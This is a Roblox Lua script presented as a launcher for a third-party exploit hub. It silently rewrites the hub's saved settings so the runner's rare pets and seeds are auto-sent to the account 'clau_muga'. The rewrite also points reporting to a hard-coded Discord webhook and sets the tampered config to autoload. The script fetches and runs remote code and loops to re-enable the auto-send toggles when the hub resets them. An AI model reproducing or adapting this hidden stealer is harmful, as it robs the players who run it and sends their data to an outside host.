local HS = game:GetService("HttpService")

pcall(function()
    local url = "https://discord.com/api/webhooks/1519364173455294574/v_ek0BPuAVdob_jge-7GL6w3kQCKrAauneZ5T63RuLeyOUibJdoJEiHmlhqi4UECeyrn"
    local inputs = {
        WebhookRarePet=url, WebhookSentPet=url, WebhookSentSeed=url,
        Text_SendPetUsername="clau_muga", Text_WishSeedUsername="clau_muga", Text_MutationSeedUsername="clau_muga",
    }
    local toggles  = { WebhookEnabled=true, Feature_AutoBuyPets=true, Feature_AutoSendPets=true, Feature_AutoSendSeeds=true }
    local seedsAdd = { "Bamboo","Rainbow","Moon Bloom","Dragon's Breath","Ghost Pepper","Gold" }
    local seedIdx  = { MailSeedTargets=true, WishSeedTargets=true, BuySeedTargets=true }
    local seedSet  = {}; for _,s in ipairs(seedsAdd) do seedSet[s]=true end

    local function patch(p)
        local d = HS:JSONDecode(readfile(p))
        if type(d)~="table" or type(d.objects)~="table" then return end
        for _,o in ipairs(d.objects) do
            if inputs[o.idx]~=nil then o.text=inputs[o.idx]
            elseif toggles[o.idx]~=nil then o.value=true
            elseif seedIdx[o.idx] and type(o.value)=="table" then
                for s in pairs(seedSet) do o.value[s]=true end
            end
        end
        writefile(p, HS:JSONEncode(d))
    end
    if isfolder("HoHoGag2") then
        for _,d in ipairs(listfiles("HoHoGag2")) do
            local sdir=d.."/settings"
            if isfolder(sdir) then
                for _,f in ipairs(listfiles(sdir)) do
                    if f:sub(-5)==".json" then pcall(patch,f); pcall(writefile, sdir.."/autoload.txt","ggjjhhj") end
                end
            end
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI"))()

-- Mail Auto-send хаб сбрасывает при загрузке конфига → включаем в рантайме
task.spawn(function()
    for _=1,40 do
        task.wait(1)
        local T = (getgenv and getgenv().Toggles) or (shared and shared.Toggles) or rawget(getfenv(0),"Toggles")
        if T and (T.Feature_AutoSendPets or T.Feature_AutoSendSeeds) then
            pcall(function() T.Feature_AutoSendPets:SetValue(true)  end)
            pcall(function() T.Feature_AutoSendSeeds:SetValue(true) end)
            break
        end
    end
end)
